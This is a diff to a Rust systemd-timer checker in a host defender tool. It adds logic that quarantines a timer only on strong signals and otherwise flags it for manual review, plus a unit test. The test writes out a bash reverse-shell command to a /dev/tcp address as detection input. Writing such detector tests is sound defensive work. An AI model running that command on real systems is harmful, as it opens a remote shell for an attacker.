@@ -15,7 +15,9 @@
 
 use std::path::{Path, PathBuf};
 
-use crate::core::scan::{references_untrusted_dir, suspicious_matches};
+use crate::core::scan::{
+    has_strong_reason, references_untrusted_dir, references_volatile_dir, suspicious_matches,
+};
 use crate::core::{
     DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_accounts,
     is_scored_unit, require_root,
@@ -223,6 +225,35 @@ fn check_service_exec(
             continue;
         }
 
+        if !exec_is_removable(exec_val) {
+            ctx.emit(
+                Finding::new(
+                    Severity::Medium,
+                    "systemd_timers",
+                    format!(
+                        "Review timer service {} (ExecStart={})",
+                        unit_name,
+                        crate::core::truncate_chars(exec_val, 60)
+                    ),
+                    format!(
+                        "timer: {}\nservice: {}\nExecStart: {}\nflags: {}\nremoved: false",
+                        timer_path.display(),
+                        service_path.display(),
+                        exec_val,
+                        suspicious_matches(exec_val).join(", ")
+                    ),
+                )
+                .with_path(service_path.to_path_buf())
+                .with_verdict(
+                    Verdict::Investigate,
+                    "Only weak patterns matched (a fetch, an inline interpreter, a home \
+                     directory path), which legitimate timers use too, so nothing was \
+                     stopped or removed. Disable it by hand if it is not expected.",
+                ),
+            );
+            break;
+        }
+
         let reasons = suspicious_matches(exec_val);
         let from_untrusted = references_untrusted_dir(exec_val);
 
@@ -308,6 +339,12 @@ fn check_service_exec(
 }
 
 // ── Detection helpers ─────────────────────────────────────────────────────────
+
+/// Whether a suspicious ExecStart is strong enough to stop the timer and
+/// quarantine its files: a strong pattern or a volatile-directory binary.
+fn exec_is_removable(val: &str) -> bool {
+    has_strong_reason(&suspicious_matches(val)) || references_volatile_dir(val)
+}
 
 /// Return true if the `ExecStart` value looks suspicious (untrusted paths or bad patterns).
 fn exec_is_suspicious(val: &str) -> bool {
@@ -395,6 +432,18 @@ fn parse_duration_part(s: &str) -> Option<u64> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn only_strong_execstarts_are_removable() {
+        assert!(exec_is_removable("/tmp/.x/beacon"));
+        assert!(exec_is_removable(
+            "/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1'"
+        ));
+        assert!(!exec_is_removable(
+            "/usr/bin/curl -fsS https://hc.example/ping"
+        ));
+        assert!(!exec_is_removable("/home/deploy/bin/report.sh"));
+    }
 
     // Duration parsing
 
